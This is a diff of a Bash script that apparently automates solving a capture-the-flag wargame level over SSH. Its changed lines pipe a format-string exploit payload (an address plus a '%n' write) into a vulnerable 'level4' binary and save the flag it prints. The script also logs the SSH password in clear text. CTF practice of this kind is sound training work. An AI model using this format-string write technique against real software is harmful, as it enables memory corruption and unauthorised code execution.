@@ -31,9 +31,9 @@ main() {
     log "Authenticating to SSH server at $host:$port with username '$username' and password '$password'...";
 
     ssh_initialize_socket "$host" "$port" "$username" "$password" || { log "Error: Failed to initialize SSH socket."; return 1; }
-    # ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
-    ssh_exec_via_socket "$host" "$port" "$username" 'printf "%b\n" "\020\230\004\010%16930112c%12\$n" | ~/level4';
-    # flag=$(ssh_exec_via_socket "$host" "$port" "$username" "tail -n1 /tmp/flag.txt && rm -f /tmp/flag.txt");
+    ssh_exec_via_socket "$host" "$port" "$username" "rm -f /tmp/flag.txt && touch /tmp/flag.txt";
+    ssh_exec_via_socket "$host" "$port" "$username" 'printf "%b\n" "\020\230\004\010%16930112c%12\$n" | ./level4 | tr -cd "a-zA-Z0-9" > /tmp/flag.txt';
+    flag=$(ssh_exec_via_socket "$host" "$port" "$username" "cat /tmp/flag.txt && rm -f /tmp/flag.txt");
     ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; }
     
     if [ -z "$flag" ]; then
